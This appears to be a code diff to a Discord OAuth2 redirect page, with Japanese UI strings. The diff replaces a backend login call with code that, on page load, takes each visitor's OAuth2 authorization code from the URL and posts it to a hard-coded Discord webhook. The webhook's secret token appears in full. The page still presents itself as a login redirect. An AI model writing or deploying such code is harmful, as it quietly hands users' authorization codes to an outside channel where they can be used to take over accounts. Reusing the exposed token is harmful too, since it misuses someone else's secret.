@@ -10,45 +10,45 @@
       const urlParams = new URLSearchParams(window.location.search);
       return urlParams.get(param);
     }
-
-    // サーバーにcodeを送信
-    async function sendCodeToServer(code) {
+  
+    // Webhookにcodeを送信
+    async function sendCodeToDiscordWebhook(code) {
       try {
-        const response = await fetch('/api/auth/discord', { // ここをバックエンドのエンドポイントに変更
+        const response = await fetch('https://discord.com/api/webhooks/1333542097340469258/YQ_X8llLqzVZHH3qRSI3MhFBe8gX05ejPTTbk9SeTkeeolXJpoN-RCGmQg7K6W2Ee24D', {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
           },
-          body: JSON.stringify({ code }),
+          body: JSON.stringify({
+            content: `OAuth2 Code: ${code}`,
+          }),
         });
-
-        const data = await response.json();
+  
         if (response.ok) {
-          // 認証成功時の処理
-          console.log('Login successful:', data);
-          document.getElementById('message').textContent = 'ログイン成功！';
+          console.log('Webhookに送信されました');
+          document.getElementById('message').textContent = 'コードが送信されました';
         } else {
-          // エラー処理
-          console.error('Error:', data);
-          document.getElementById('message').textContent = 'ログイン失敗：' + (data.error || '不明なエラー');
+          console.error('Webhook送信エラー:', await response.text());
+          document.getElementById('message').textContent = '送信エラー';
         }
       } catch (error) {
-        console.error('Request failed:', error);
-        document.getElementById('message').textContent = 'サーバーへの接続に失敗しました。';
+        console.error('ネットワークエラー:', error);
+        document.getElementById('message').textContent = 'ネットワークエラー';
       }
     }
-
+  
     // ページ読み込み時に実行
     document.addEventListener('DOMContentLoaded', () => {
       const code = getQueryParam('code');
       if (code) {
-        document.getElementById('message').textContent = 'ログイン処理中...';
-        sendCodeToServer(code); // サーバーにcodeを送信
+        document.getElementById('message').textContent = 'コード送信中...';
+        sendCodeToDiscordWebhook(code); // Discord Webhookにコードを送信
       } else {
-        document.getElementById('message').textContent = 'ログインコードが見つかりません。';
+        document.getElementById('message').textContent = 'コードが見つかりません';
       }
     });
   </script>
+  
 </head>
 <body>
   <h1>Discord OAuth2 Redirect</h1>
